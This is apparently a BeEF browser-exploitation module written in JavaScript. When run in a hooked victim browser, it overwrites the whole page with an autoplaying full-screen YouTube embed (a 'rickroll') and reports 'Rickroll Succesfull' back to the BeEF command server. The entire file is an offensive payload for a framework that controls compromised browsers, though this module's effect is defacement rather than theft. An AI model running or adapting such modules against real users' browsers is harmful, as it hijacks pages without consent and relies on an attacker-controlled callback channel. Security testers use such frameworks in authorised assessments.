beef.execute(function() {
	document.body.innerHTML = '<object width="100%" height="100%"><param name="movie" value="http://www.youtube.com/v/dQw4w9WgXcQ?fs=1&amp;hl=en_US&amp;autoplay=1"><param name="allowFullScreen" value="true"><param name="allowscriptaccess" value="always"><embed src="http://www.youtube.com/v/dQw4w9WgXcQ?fs=1&amp;hl=en_US&amp;autoplay=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="100%" height="100%"></object>';

    beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Succesfull");
});